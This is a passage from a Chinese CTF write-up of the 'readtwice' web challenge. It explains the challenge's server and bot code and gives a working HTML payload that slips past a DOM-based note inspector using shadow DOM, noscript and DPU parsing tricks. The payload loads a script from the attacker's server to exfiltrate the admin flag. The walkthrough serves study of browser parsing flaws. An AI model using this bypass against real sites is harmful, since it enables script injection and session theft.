# readtwice 题解与完整复现

| 项 | 值 |
|---|---|
| 比赛 | PwnSec CTF 2026 |
| 类别 | Web |
| 难度 | Hard |
| 分值 | 260 |
| 远程实例 | 已随比赛结束销毁，无法访问 |
| 本地 flag | `pwnsec{real_flag_on_remote}`（本地部署配置里的占位值） |
| 真实 flag | `pwnsec{1503fc99f750c466}` |
| 解题状态 | 比赛期间未独立解出；赛后根据公开题解在本地完整复现成功 |

> 名词说明：**flag** 指比赛的最终目标字符串（本题格式为 `pwnsec{...}`），拿到它代表解出本题。
>
> **CTF** 指 Capture The Flag，网络安全夺旗赛；类别 **Web** 指网页应用方向，难度档 **Hard** 对应"困难"。
>
> **机器人（bot）** 指题目内置的自动化无头浏览器：它持有管理员的登录会话（cookie），按固定流程执行审查；其中访问你提交的网址时不携带管理员 cookie。

阅读说明：本文按"先讲清系统与规则，再逐项解决四个问题，最后给出可复制的完整复现"组织。第二章是主章节，从部署开始按攻击发生的顺序推进；涉及浏览器机制（解析差异、影子 DOM、DPU、消息端口、Fetch Metadata、历史回退）时，在使用它们的段落就地解释，不要求提前理解。第三章起是速查、日志、脚本讲解、复现指南、防御与复盘，可单独查阅。

## 目录

- [一、这道题在做什么](#一这道题在做什么)
- [二、完整复现（从部署到拿到 flag）](#二完整复现从部署到拿到-flag)
- [三、速查与参考](#三速查与参考)
- [四、完整链复现日志](#四完整链复现日志)
- [五、攻击脚本逐段讲解](#五攻击脚本逐段讲解)
- [六、复现指南](#六复现指南)
- [七、防御建议](#七防御建议)
- [八、比赛过程复盘与改进方案](#八比赛过程复盘与改进方案)
- [附录](#附录)

---

## 一、这道题在做什么

题目是一个笔记系统。你可以创建笔记、预览笔记，也可以把任意网址提交给"审查员"检查。审查员是一个自动化无头浏览器（本文称"机器人"），它持有管理员的登录会话，并且可以读取 flag。它收到网址后会按固定流程访问，全过程不受提交者控制。

flag 在管理员专属接口 `/api/flag` 里，只有管理员会话能读到。你的目标：让一段自己写的 JavaScript 在机器人浏览器的挑战域（挑战域：题目服务器自身的网域，容器内为 `http://localhost:3000`）页面上执行，借它的管理员身份读走 flag。

系统的四个角色：

| 角色 | 说明 |
|---|---|
| 用户（你） | 创建笔记、提交网址；在服务器眼里没有任何特殊权限 |
| 服务器 | 网站程序，保存笔记、维护"当前审查任务"的状态、提供 `/api/flag` |
| 机器人 | 内置在服务器进程里的自动化浏览器，持有管理员会话，按固定流程执行审查 |
| 攻击者 | 你的目标身份：让机器人的浏览器替你把 flag 读出来 |

### 三条必须先记住的规则

1. **笔记要经过严格的格式检查**。`POST /create` 会把提交的 HTML（截取前 512 字符）交给无头浏览器，在**关闭 JavaScript、断网**的条件下解析一次并检查最终 DOM；不通过直接拒绝。检查要求见 2.2：在**检查器这一次解析**中，`head` 必须恰好一个 CSP meta 标签、`body` 恰好一个空 `div`（属性与文本另有约束）。该约束只作用于检查器这一次解析；保存的是提交的字符串本身，之后它会被重新解析渲染（`/sandbox` 一次、审查页第二次访问一次），且渲染结果可以与检查结果不同。2.2.1 的利用点即在此。
2. **机器人固定按顺序做五步**：登录管理员会话 → 访问审查页（第一次，只做标记）→ 访问 `/api/flag`（把 flag 缓存进本轮审查记录）→ 带机器人口令 `X-Bot-Token` 调用 `/reports/arm/:id`（把审查置为"已就位"）→ 访问你提交的网址并停留 10 秒。整个流程由同一个浏览器上下文执行（第 1 步在该上下文中建立管理员会话）；管理员会话只随发往应用主机（`localhost`）的请求发送，**发往你提交站点的请求不携带它**。
3. **审查页只在第二次访问时输出笔记原文，且该次响应不带任何 CSP 响应头**。审查页 `GET /reports/check` 第一次被访问时只设置一个"已访问"标记并返回占位页；第二次访问要通过全部检查，才会把笔记 HTML 原样输出。这个输出点就是整条攻击链的终点。

> 关于第 3 条的两点说明：
> - **CSP**（Content Security Policy，内容安全策略）：浏览器用来限制页面能加载和执行哪些内容的机制，通过 HTTP 响应头或页面内的 meta 标签下发。本题中，检查器要求每篇笔记自带一个 CSP meta 标签，声明 `default-src 'none'`（禁止一切外部资源），但第 3 条说的那个输出点，**既不带响应头 CSP，笔记自带 meta 的生效时机也晚于脚本执行**。机制在 2.2.1 与 2.6.3 展开。
> - "第二次访问"这个名字来自源码结构：`GET /reports/check` 的处理函数先判断 `currentReview.visited` 是否已为真，为真走"渲染分支"，为假走"标记分支"。这两个名字是本文对两段代码的称呼，源码中并没有它们。

### 攻击链概要

1. 准备一篇"检查时是空白文档、渲染时执行脚本"的笔记（2.2.1）；
2. 准备你自己的服务器并提供四个端点，把它的网址提交给机器人（2.3、2.4）；
3. 机器人访问期间：借它的浏览器打开审批页面，把审批状态置为"已批准"（2.6、2.7）；
4. 用浏览器历史回退制造一次满足 `Sec-Fetch-Site: none` 的导航，让审查页发生第二次访问并通过全部检查（2.8）；
5. 笔记原文在挑战域内被渲染，脚本再次执行，读取 flag 并发送到你自己的服务器（2.9）。

### 术语约定

本文对几个反复出现的名字做如下约定（其余专有名词见附录 B）：

| 名字 | 指什么 |
|---|---|
| 路径 | URL 里域名和端口之后的那一段；服务器靠它决定返回什么内容。只写一个斜杠（`/`）时叫根路径。例：`http://host.docker.internal:8000/?note=1` 的路径是 `/` |
| 路由 | 服务器把某个路径绑定到某段处理代码；请求命中哪条路由，就由对应代码处理。如 `GET /reports/check` 是审查页的路由 |
| 检查器 | `bot.js` 里的 `inspectDocument` 函数：创建笔记时的 DOM 检查 |
| 审查页 | 路由 `GET /reports/check` |
| 审批页面 | 路由 `GET /review`，内含沙箱 iframe 与"收到就绪信号后批准"的逻辑 |
| 沙箱页 | 路由 `GET /sandbox`，在 iframe 里渲染笔记原文（带 `sandbox allow-scripts` CSP） |
| 入口页 | 攻击者提交给机器人的那个网址所对应的页面（攻击者控制） |

---

## 二、完整复现（从部署到拿到 flag）

本章目标：从部署开始，按一次成功复现的真实发生顺序，走完整条攻击链直到拿到 flag，不跳步。全章顺序：准备阶段（2.1 部署；2.2 笔记检查器与攻击笔记；2.3 准备你自己的服务器；2.4 提交）；机器人执行阶段（2.5 五步流程，其中第 2 步到访审查页时就地讲解它的两次访问与八项检查）；攻击窗口（2.6 到 2.9：机器人第 5 步停留的 10 秒内，按时间先后发生的四段攻击；笔记被渲染时的逐步推演在 2.6.3）；2.10 汇总完整时序。涉及的浏览器机制在使用它们的段落就地解释，不要求提前理解。

### 2.1 部署

题目附件解压后是一份可构建的源码目录（文件清单见附录 A）。先看 `docker-compose.yml` 里的环境变量：

```yaml
environment:
  PORT: "3000"
  APP_URL: "http://localhost:3000"
  FLAG: "pwnsec{real_flag_on_remote}"
  BOT_TOKEN: "local-bot-token"
  SESSION_SECRET: "looosoosw"
```

| 变量 | 作用 |
|---|---|
| `FLAG` | 目标字符串本体，`/api/flag` 返回的就是它；本地是占位值，远程部署时替换为真实 flag |
| `BOT_TOKEN` | 机器人口令：`/reports/session` 与 `/reports/arm/:id` 两个接口会校验请求头 `X-Bot-Token`。攻击者不知道它 |
| `SESSION_SECRET` | 会话 cookie 的签名密钥，防止伪造会话；本地为固定测试值 |
| `PORT` / `APP_URL` | 服务监听端口；机器人访问服务所用的基地址（容器内视角） |

启动并验证：

```bash
cd readtwice
docker compose up -d --build
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3001/    # 期望 200
```

> 端口说明：附件把宿主机端口 `3001` 映射到容器端口 `3000`（compose 里 `3001:3000`）。容器内的服务器和机器人把服务看作 `http://localhost:3000`。后文提到 `localhost:3000` 都是容器内视角；从宿主机访问用 `127.0.0.1:3001`。

### 2.2 笔记检查器与攻击笔记

#### 2.2.1 攻击笔记与检查器

**真实提交数据**：这是要提交给 `/create` 的攻击笔记（写成一行；把 `https://你的服务器` 替换成你自己的实际地址，2.3 准备它）：

```html
<!doctype html><head><?marker name="c"></head><div><template shadowrootmode=open><noscript><a alt="</noscript></template><script src=https://你的服务器/s.js></script>">x</a></noscript></template></div><template for=c><meta content="default-src 'none'"http-equiv=content-security-policy></template>
```

把它存为 `payload.html` 后提交：

```bash
curl -si http://127.0.0.1:3001/create -d 'title=t' --data-urlencode html@payload.html | head -3
# 期望：HTTP/1.1 302 Found   Location: /note/<编号>
# 记下 <编号>：后面的提交地址（2.4）与 2.6.4 的验证都要带上它；第五章脚本的取法：note_id = created.headers["Location"].rsplit("/", 1)[-1]
```

它依赖两个解析特性：声明式 Shadow DOM（Chrome 90/111/124）与 DPU（Chrome 150+）；本题容器内是 Chromium 152，都支持（以目标环境实测为准，不要只凭版本号判断）。

**提交后发生什么**：`POST /create` → `src/server.js` 的 `/create` 处理器 → 调用 `bot.js` 的 `inspectDocument(html)`：

```javascript
app.post("/create", async (req, res) => {
  const title = String(req.body.title || "").trim().slice(0, 10);
  const html = String(req.body.html || "").slice(0, 512);   // 笔记只取前 512 字符

  if (!title || !html) {
    res.status(400).render("message", { title: "Bad note", message: "Missing title or body." });
    return;
  }

  if (!(await inspectDocument(html))) {                     // ★ 调用检查器；不通过返回 400
    res.status(400).render("message", { title: "Bad note", message: "Document profile rejected." });
    return;
  }

  const id = randomId(10);                                  // 通过：保存笔记
  notes.set(id, {
    id,
    title,
    html,
    createdAt: Date.now(),
  });

  res.redirect(`/note/${encodeURIComponent(id)}`);          // 302 到预览页
});
```

`inspectDocument` 是 `bot.js` 里的一个函数：用 Puppeteer（bot.js 的浏览器自动化库）启动一个无头 Chromium，**关闭 JavaScript、断网**，用 `page.setContent` 把字符串交给它解析，解析完成后用 `page.evaluate` 对最终 DOM 做判定。它的内部代码：

```javascript
// page 是 Puppeteer 的页面对象：bot.js 通过 Puppeteer 驱动容器内的无头 Chromium（bot/package.json 依赖 puppeteer ^24.32.0，package-lock.json 锁定 24.43.0）
await page.setJavaScriptEnabled(false);   // 关闭 JavaScript：检查阶段不执行笔记中的脚本；解析规则随之变为"禁用脚本"模式（noscript 按标记解析，这是 2.2.1 的攻击笔记利用的点之一）
await page.setOfflineMode(true);           // 断网：检查阶段不加载任何外部资源（笔记无法在检查时与外部通信）
await page.setContent(source, { waitUntil: "domcontentloaded", timeout: 5000 });   // 把 HTML 字符串直接写入页面：得到"笔记解析后的 DOM"供下面的判定读取（不经过网络加载）

// 应用场景：/create 创建笔记的判定环节（inspectDocument 的最后一步）。此时笔记已解析完成，此函数由 puppeteer 注入页面执行，不受上面"关闭 JavaScript"影响。
// 目的：判定这篇笔记能否入库（返回 true 才会保存），确保入库笔记只能是"一个 CSP meta + 一个空 div"的固定结构，防止夹带可执行内容。
// 功能：读取最终 DOM 逐条判定，全部条件成立返回 true，否则返回 false。
return await page.evaluate(() => {
  const declaration = document.head.firstElementChild;   // 取 head 的第一个元素：后面的判定要求它是 CSP meta
  const surface = document.body.firstElementChild;       // 取 body 的第一个元素：后面的判定要求它是空 div
  const attributeProfile = [                             // 属性白名单：每项 = [元素, 允许的属性名数组]，逐项检查；清单之外的属性（如 onerror 等事件属性）一律拒绝
    [document.documentElement, []], [document.head, []], [document.body, []],
    [declaration, ["http-equiv", "content"]], [surface, []],
  ].every(([el, allowed]) =>
    el && el.getAttributeNames().every(name => allowed.includes(name)));

  // 七项判定（全部成立才返回 true）：
  return document.doctype?.name === "html"               // 有 doctype 且名称为 html
    && document.head.childElementCount === 1             // head 恰好 1 个元素
    && declaration?.localName === "meta"                 // 且必须是 meta
    && declaration.httpEquiv.toLowerCase() === "content-security-policy"   // 且 http-equiv 为 content-security-policy
    && declaration.content === "default-src 'none'"      // 且 content 逐字符相等
    && document.body.childElementCount === 1             // body 恰好 1 个元素
    && surface?.localName === "div"                      // 且必须是 div
    && surface.childElementCount === 0                   // 且 div 没有子元素
    && document.body.textContent.trim() === ""           // body 文本 trim 后为空
    && attributeProfile;
});
```

**判定标准**：对上面的判定逐项拆开：

| # | 要求 | 说明 |
|---|---|---|
| 1 | 有 doctype，且名称为 `html` | `<!doctype html>` |
| 2 | `head` 恰好 1 个**元素** | 注释、文本、处理指令不算元素，不参与计数 |
| 3 | 该元素是 `meta`，`http-equiv` 为 `content-security-policy`，`content` 为 `default-src 'none'` | 即笔记必须自带一条 CSP 声明 |
| 4 | `body` 恰好 1 个**元素** | 同上，非元素节点不算 |
| 5 | 该元素是 `div`，且没有子元素 | `div` 必须是空的 |
| 6 | `body` 里的全部文本（去掉首尾空白后）为空 | 文本只能是空白字符 |
| 7 | 属性白名单：`html`/`head`/`body`/`div` 不允许有任何属性；`meta` 只允许 `http-equiv` 和 `content` | 防止用事件属性（如 `onload`）夹带代码 |

对照检查器视角，一篇合法的笔记长这样：

```html
<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div></div></body></html>
```

这只是合法形态的一例，不是唯一形态。判定标准是上面七项条件全部成立，而不是与示例逐字相同；2.2.1 的攻击笔记与它源码完全不同，但检查器解析出的元素结构一致，同样通过检查。更多示例与通过原因见 2.2.2。

用 curl 创建并确认通过（通过会 302 到预览页）：

```bash
curl -si http://127.0.0.1:3001/create \
  -d 'title=t' \
  --data-urlencode 'html=<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src '"'"'none'"'"'"></head><body><div></div></body></html>' \
  | head -3
# 期望：HTTP/1.1 302 Found   Location: /note/<编号>
```

这个检查的直接后果：**检查器只约束它计数的结构**：`head`/`body` 的元素数量、`meta` 与 `div` 的属性、`body` 的文本；注释、处理指令、声明式影子树的内容不在计数范围内，不受这些约束。检查用的三个设置（JavaScript 关闭、离线、字符串直投）就是这份攻击笔记要利用的突破口，先记住它们。

**逐步推演与代码核对**：把上面的字符串提交给 `/create` 后，检查器（`inspectDocument`）逐步处理它如下（每步都对应字符串里的实际字符）：

1. `<!doctype html>` → doctype 名称为 `html` ✓；
2. `<head>` 开始；
3. `<?marker name="c">` → 处理指令节点（**不是元素**，不计数）。这是 DPU 的占位点：meta 不直接写在这里，因为渲染时它会立刻生效、用 `default-src 'none'` 把要加载的脚本拦掉；放到文档末尾后由 DPU 在解析末尾搬回来（步骤 12）；
4. `</head>`；
5. `<div>` → body 隐式创建，div 进入 body；
6. `<template shadowrootmode=open>` → div 上创建影子根（shadow root），template 内容全部进入影子树；template 元素本身不进文档树。这是声明式影子树的写法（普通影子树要用 JavaScript 的 `attachShadow()` 创建）；影子根不是 div 的子节点、影子树里的节点也不在 div 的普通子树里，所以后面的内容都不会被计数；
7. `<noscript>` → JS 关闭：noscript 的内容按**普通标记解析**（即和文档其他部分一样地解析）：里面的 `<...>` 按正常规则识别为标签（标签名、属性、文本照常处理），而不是被当成一整段纯文本；
8. `<a alt="` → `alt` 属性值从引号开始，一直读到下一个引号（在 `</script>` 之后）才结束：中间 `</noscript></template><script src=...></script>` 全是属性值里的字符，**不会解析出任何元素**（那个 `<script>` 只是字符串）；生成的 `<a>` 元素位于影子树内部；
9. `">x</a>` → `<a>` 闭合（影子树内部）；随后 `</noscript>` 闭合 noscript（影子树内部）；
10. `</template>` → 影子根内容插入结束；
11. `</div>` → div 闭合；**div 的普通子元素数量为 0**（步骤 6-10 的内容都在影子树里）；
12. `<template for=c>` → DPU 搬运：meta 被放入 head 中 marker 的位置（搬运发生在解析到这条 template 的时刻）；template 本身不进文档树；
13. 解析结束。检查器看到的最终 DOM：`head` 里只有 meta 一个元素（marker 的位置被搬入的内容替换；元素计数 1），`body` = [div]（元素计数 1），div 子元素 0，body 文本只含空白，全部元素无多余属性 → **七项检查全过** ✓。

对照上面的判定代码逐条核对（读的就是步骤 13 的这个 DOM）：

- `document.doctype?.name === "html"` ✓（步骤 1 的 doctype）；
- `document.head.childElementCount === 1`、`declaration.localName === "meta"`、`httpEquiv` 与 `content` 逐字符相等 ✓（步骤 12 搬入的 meta）；
- `document.body.childElementCount === 1`、`surface.localName === "div"`、`surface.childElementCount === 0` ✓（步骤 5-11，div 的普通子元素为 0）；
- `document.body.textContent.trim() === ""` ✓（文本都在影子树里，不计入）；
- 属性白名单 `attributeProfile` ✓（`html`/`head`/`body`/`div` 无属性；meta 只有 `http-equiv` 与 `content`）。

七项全部成立，`inspectDocument` 返回 `true`；处理器保存笔记并 302 到预览页。

#### 2.2.2 更多合法示例与通过原因

下面五个示例形态各不相同，全部能通过检查器；每例之后说明它为什么能通过（判定依据都是上面的七项条件）。

**例 1：省略隐含标签**

```html
<!doctype html><meta http-equiv="content-security-policy" content="default-src 'none'"><div></div>
```

HTML 解析器会自动补出 `html`/`head`/`body`：`meta` 进入 head，`div` 进入 body。检查器看到的结构与最小示例完全相同，因此七项条件全部成立。

**例 2：注释与空白文本**

```html
<!doctype html><html><head><!-- 说明 --><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><!-- 占位 --><div></div> </body></html>
```

注释和空白文本不是元素，不参与任何计数：head 的元素仍是 1 个（meta），body 的元素仍是 1 个（div），body 的全部文本去掉空白后为空。七项条件全部成立。

**例 3：meta 由 DPU 从文档末尾搬进 head**

本例用到 DPU（Declarative Partial Updates，声明式部分更新），先说明它是什么：这是 HTML 的一个解析特性；`<?marker name="c">` 在文档中留一个占位点（处理指令节点，不是元素），文档后面的 `<template for=c>` 提供内容；解析器读到 `<template for=c>` 时，把它的内容搬入占位点的位置（占位点被替换）。完整推演见 2.2.1（检查器侧）与 2.6.3（渲染侧）。

```html
<!doctype html><head><?marker name="c"></head><div></div><template for=c><meta http-equiv="content-security-policy" content="default-src 'none'"></template>
```

检查在整份文档解析完成之后执行；此时 DPU 已完成搬入，meta 出现在 head 里，占位点（处理指令）不参与元素计数。最终元素结构与最小示例相同，七项条件全部成立。

**例 4：用声明式影子树藏起其他元素**

```html
<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode=open><p>影子内容</p></template></div></body></html>
```

本例用到声明式影子树（Shadow DOM），先说明它是什么：某个元素上可以挂一棵独立的 DOM 树，这棵树叫影子树。影子根不是该元素的子节点，影子树里的节点也不在该元素的普通子树（由该元素的普通子节点构成）中；`children`、`childElementCount`、`textContent` 这类访问都只遍历普通子树，因此看不到影子树里的内容。带 `shadowrootmode` 的 template 会被解析器消费：它的内容全部进入 div 的影子树，template 本身不留在普通树里。检查器数到的 div 是空的，影子树里的文本也不计入 `body.textContent`。完整推演见 2.2.1（检查器侧）与 2.6.3（渲染侧）。七项条件全部成立。

**例 5：影子树里放脚本（攻击形态的检查器视角）**

```html
<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode=open><script src=https://你的服务器/s.js></script></template></div></body></html>
```

机制与例 4 相同，只是把影子内容换成了 `<script>`。检查器不计数影子树，也不会执行脚本（因为 JavaScript 被关闭，上面已经讲过），它看到的结构与例 4 一模一样，七项条件全部成立；而浏览器渲染这份笔记时，影子树里的脚本会执行（渲染侧的推演见 2.6.3）。这就是 2.2.1 的攻击笔记能通过检查的原理。

以上五个示例均已提交给真实检查器实测（`/create` 全部返回 302；未通过检查的笔记会返回 400）。

### 2.3 准备你自己的服务器

攻击笔记已经就绪（2.2）。还需要一个攻击者自己搭的服务器（机器人会反过来访问它，从它上面加载页面和脚本，最后把 flag 也送到它这里）：入口页（机器人打开提交的地址后看到的那张页面，由攻击者自己编写）、笔记里引用的脚本、接收 flag 的端点都放在它上面。它必须能被机器人访问到：本地复现时它就是一个跑在宿主机上的程序，容器通过 `http://host.docker.internal:8000` 访问（`host.docker.internal` 是 Docker 提供的一个特殊域名，指向宿主机）；远程做题时用一个公网可达的地址（例如公共 webhook 服务或自己的 VPS）。它提供四个端点：

| 路由 | 第一次响应 | 第二次响应 | 作用 |
|---|---|---|---|
| `/`（根路径，带 `?note=` 参数） | 一段带 JavaScript 的 HTML | 302 重定向到 `http://localhost:3000/reports/check?rid=<rid>` | 入口页；第二次访问时把机器人送往审查页（2.8） |
| `/helper` | 一段带 JavaScript 的 HTML | 无 | 辅助页面：弹窗换到这里后触发主窗口的历史回退（2.8） |
| `/s.js` | JavaScript 代码 | 无 | 注入笔记中的脚本（双分支，2.2/2.9） |
| `/flag?x=<base64>` | 无 | 无 | 接收外传的 flag（2.9） |

入口页与 `/s.js` 的具体内容在对应小节逐段给出。所有响应都带 `Cache-Control: no-store`（入口页这一条在 2.8 会用到）。

实现与启动：你自己的服务器与整套攻击编排写在同一个 Python 脚本里（完整可运行代码见第五章），在宿主机直接运行该脚本即启动（监听 8000 端口；环境与步骤见 6.2）。2.6 到 2.9 会在用到它的地方引用对应代码段。

### 2.4 提交：把入口页地址交给机器人

两个材料就绪：攻击笔记（2.2）和你自己的服务器（2.3）。把服务器的入口页地址提交给机器人，整条攻击链由此启动。

#### 2.4.1 提交的网址

提交的是入口页的地址，本地复现为 `http://host.docker.internal:8000/?note=<编号>`，拆开看：

- `http://host.docker.internal:8000/`：你自己服务器的地址，也就是入口页的地址（2.3 表中 `/` 一行）；
- `?note=<编号>`：笔记编号参数，由攻击者填；编号来自 `/create` 创建笔记后返回的 `/note/<编号>`（2.2.1）；
- `&rid=<本轮编号>`：不在提交的网址里，由机器人访问前追加（2.5.1 步骤 5 的 `url.searchParams.set("rid", report.id)`）；入口页从 `location.search` 就能读到本轮编号。

提交有两个入口（等价）：

- 页面：打开实例首页（即 2.1 里启动后 curl 验证的那个地址）。首页包含 "Create note" 与 "Report document" 两块面板和最近笔记列表；其中 "Report document" 面板是提交网址的入口，填写 URL 后点 Send，浏览器提交的就是 POST /report；
- 命令行（复现脚本用这个，见第五章）：`curl -d 'url=http://host.docker.internal:8000/?note=<编号>' http://127.0.0.1:3001/report`。

"Report document" 面板的表单片段（来自 `src/views/index.ejs`，省略了外层的 `<p>` 与 `<label>` 标签）：

```html
<form method="post" action="/report">
  <input id="url" name="url" placeholder="https://example.com/" required>
  <button type="submit">Send</button>
</form>
```

表单属性与后端逐一对应：`method="post"` 与 `action="/report"` 决定点 Send 时向 `/report` 发送 POST 请求；`name="url"` 是服务器读取网址所用的键名（对应下面处理器源码里的 `req.body.url`）。

#### 2.4.2 提交后：服务器做了什么

`review` 不是由浏览器执行的，而是被 `src/server.js` 的 `/report` 路由处理器直接调用（跨文件调用）。模块接线：

- `src/server.js` 顶部：`const { inspectDocument, review } = require("../bot/bot");`（`inspectDocument` 被 `/create` 调用，`review` 被 `/report` 调用）；
- `bot/bot.js` 末尾：`module.exports = { inspectDocument, review };`。

处理器源码（`src/server.js`，注释为逐行说明）：

```javascript
app.post("/report", reportRateLimit, async (req, res) => {   // reportRateLimit：60 秒内最多 3 次
  if (currentReview) {                                       // 单例检查：上一轮审查还在进行
    res.status(429).render("message", { title: "Reviewer busy", message: "The reviewer is already checking a document. Try again shortly." });
    return;
  }

  let target;
  try {
    target = new URL(String(req.body.url || ""));            // 解析提交的网址（表单字段名 url）
  } catch {
    res.status(400).render("message", { title: "Invalid URL", message: "Invalid URL." });
    return;
  }

  if (!["http:", "https:"].includes(target.protocol)) {      // 只接受 http/https
    res.status(400).render("message", { title: "Invalid URL", message: "Only HTTP and HTTPS URLs are accepted." });
    return;
  }

  const noteId = String(target.searchParams.get("note") || ""); // 网址里的 note= 参数（笔记编号，供 /sandbox 取笔记）
  const id = randomId(12);                                       // 本轮审查编号（后续会作为 rid 追加到提交的网址上）
  currentReview = {                                              // 构造本轮审查记录：状态位全部初始化为 false
    id, url: target.href, noteId,
    prepared: false, approved: false, finalized: false, used: false, visited: false,
    nonce: randomId(16), flag: null,
  };

  try {
    await review(currentReview);                               // ★ 调用 bot.js 的 review：机器人从这里开始工作，整轮结束才返回
    res.render("message", { title: "Reviewed", message: "The reviewer finished." });
  } catch {
    res.status(500).render("message", { title: "Review failed", message: "The reviewer could not open that URL." });
  } finally {
    currentReview = null;                                      // 本轮结束：清空单例，可提交下一轮
  }
});
```

调用链逐级展开：

| 顺序 | 所在文件 | 动作 | 失败时 |
|---|---|---|---|
| 1 | server.js | `reportRateLimit` 限速：60 秒内最多 3 次 | 429 Too many review requests |
| 2 | server.js | 单例检查：`currentReview` 非空，说明上一轮审查未结束 | 429 Reviewer busy |
| 3 | server.js | 用 `new URL()` 解析提交的网址 | 400 Invalid URL |
| 4 | server.js | 协议必须是 http/https | 400 Only HTTP and HTTPS URLs are accepted |
| 5 | server.js | 取 `note=` 参数、生成编号、构造 `currentReview`（状态位全 false） | 无 |
| 6 | server.js → bot.js | `await review(currentReview)`：调用机器人，传入刚构造的同一个对象引用 | 抛错 → 500 Review failed |
| 7 | bot.js | `review()` 内部按 2.5 的五步执行 | 无 |
| 8 | server.js | 渲染 "The reviewer finished."；`finally` 清空 `currentReview` | 无 |

三个细节：

- 第 6 步是 `await`：POST /report 的响应要等整轮审查结束（约十几秒）才返回，提交方需要等待；
- `finally` 里清空 `currentReview` 之后，才允许提交下一轮（对应第 2 步的单例检查）；
- `review()` 与服务器同在一个 Node 进程内执行（bot.js 是被 server.js `require` 的模块），它启动的是独立的无头 Chromium 进程。

`await review(currentReview)` 之后，机器人开始工作；提交方会一直等到整轮结束。机器人具体做什么，下一节（2.5）按它的执行顺序讲。

### 2.5 机器人的五步执行

#### 2.5.1 五个步骤的代码与总表

`review(report)` 内部按下面的顺序执行；先看整体代码（含步骤注释）：

```javascript
const context = await browser.createBrowserContext();     // 为本次审查创建独立浏览器上下文：其下所有页面共享同一份 cookie（步骤 1 建立的管理员会话供后续步骤共用）

// 步骤 1：登录管理员会话
const sessionPage = await context.newPage();
await sessionPage.setExtraHTTPHeaders({ "X-Bot-Token": BOT_TOKEN });   // 给该页面的请求附加机器人口令头（服务端凭它建立管理员会话）
await sessionPage.goto(`${APP_URL}/reports/session`);
await sessionPage.close();

// 步骤 2+3：审查页第一次访问（标记），再读 flag 进内存
const setupPage = await context.newPage();
await setupPage.goto(`${APP_URL}/reports/check?rid=${report.id}`);
await setupPage.goto(`${APP_URL}/api/flag`);
await setupPage.close();

// 步骤 4：服务器进程内部（不经过浏览器）调用就绪接口
await fetch(`${APP_URL}/reports/arm/${report.id}`, {
  method: "POST", headers: { "X-Bot-Token": BOT_TOKEN },
});

// 步骤 5：访问提交的网址，并监听它的主导航
const page = await context.newPage();
const url = new URL(report.url);
url.searchParams.set("rid", report.id);       // 在提交的网址后追加 rid 参数（本轮编号会出现在页面地址里，供后续利用读取）
watchDocument(page, report, url.href);        // 启动主窗口导航监听（定义在 bot.js）：逐次记录主窗口导航以判定 finalized 状态（规则见 2.5.3）
await page.goto(url.href);
await sleep(10000);                            // 停留 10 秒：给提交的页面留出执行窗口（攻击链在此期间完成，见 2.10）
await page.close();
```

五个步骤与它们对状态的影响：

| 步骤 | 动作 | 状态变化 |
|---|---|---|
| 1 | 访问 `/reports/session`（带机器人口令） | 服务器给这个浏览器发管理员会话 cookie |
| 2 | 访问审查页 | `visited = true`（第一次访问，返回占位页） |
| 3 | 访问 `/api/flag` | flag 被存进本轮审查记录 `currentReview.flag` |
| 4 | 调用 `/reports/arm/<编号>` | `prepared = true` |
| 5 | 访问提交网址，停留 10 秒 | 攻击链发生在这一步内 |

第 2 步到访审查页 `/reports/check` 、第 5 步开始监听主窗口导航，这两处直接决定攻击怎么做，分别在 2.5.2、2.5.3 就地展开。另外从第 5 步起机器人进入攻击者的页面，有三个已知条件：

- 机器人会先把 `rid` 追加到提交的入口网址上，入口页从 `location.search` 读到本轮编号；
- 步骤 5 的页面是主窗口，它的每次导航都被 `watchDocument` 监听（2.5.3）；
- 管理员会话只随发往挑战域 `localhost` 的请求发送；发往攻击者页面的请求不带它（2.6 会用到）。

步骤 5 停留的 10 秒就是全部攻击动作的时间窗，2.6 到 2.9 都发生在这段时间内。

#### 2.5.2 步骤 2 到访的审查页：两次访问、八项检查与攻击目标

机器人的第 2 步到访审查页，只做一件事：把 `visited` 置真（第一次访问，返回占位页）。这个页面还有第二次访问，那是整条攻击链的终点：第二次访问要过全部八项检查，然后输出笔记原文。审查页的完整源码结构如下（注释标出每项检查）：

```javascript
app.get("/reports/check", (req, res) => {
  res.setHeader("Cache-Control", "no-store");

  if (!req.session.admin) { /* 403 forbidden */ }              // 检查 1：管理员会话
  const id = String(req.query.rid || "");
  if (!currentReview || currentReview.id !== id) { /* 404 */ } // 检查 2：rid 匹配

  if (currentReview.visited) {
    // ===== 渲染分支（第二次访问）=====
    const note = notes.get(currentReview.noteId);
    if (!note) { /* 404 not found */ }                         // 检查 3：笔记存在
    if (!policy(req) || !consumeReport(req)) { /* 403 */ }     // 检查 4-8
    res.type("html").send(note.html);                          // 输出笔记原文；注意：没有 CSP 响应头
    return;
  }

  // ===== 标记分支（第一次访问）=====
  currentReview.visited = true;
  res.type("html").send("<!doctype html><title>Reviewer</title><p>Opening document.</p>");
});
```

检查 4 单独展开（`policy`）：

```javascript
function policy(req) {
  return Object.entries({
    "sec-fetch-site": "none",        // 要求：请求由浏览器发起（没有页面来源）
    "sec-fetch-dest": "document",    // 要求：目标是顶层文档导航
  }).every(([header, expected]) => req.get(header) === expected);
}
```

检查 5-8 展开（`consumeReport` 内的四个状态位）：

```javascript
if (!currentReview
    || currentReview.id !== id          // 再次确认 rid
    || !currentReview.prepared          // 检查 5：机器人已就位
    || !currentReview.approved          // 检查 6：审查已批准
    || !currentReview.finalized         // 检查 7：主窗口导航已命中审查页
    || currentReview.used)              // 检查 8：尚未被消费
  return false;
currentReview.used = true;              // 全部通过：立即置"已消费"，同一轮只输出一次
```

把第二次访问要过的全部检查列成清单（这就是攻击链要逐项满足的目标）：

| # | 检查项 | 来源 | 谁满足 |
|---|---|---|---|
| 1 | 管理员会话 | 请求必须携带机器人登录后的会话 cookie | 机器人：但请求必须由它发出 |
| 2 | rid 匹配 | 网址里的 `rid` 等于本轮审查编号 | 机器人自动追加；攻击者可从自己页面读到 |
| 3 | 笔记存在 | 本轮绑定了一篇存在的笔记 | 攻击者自己准备 |
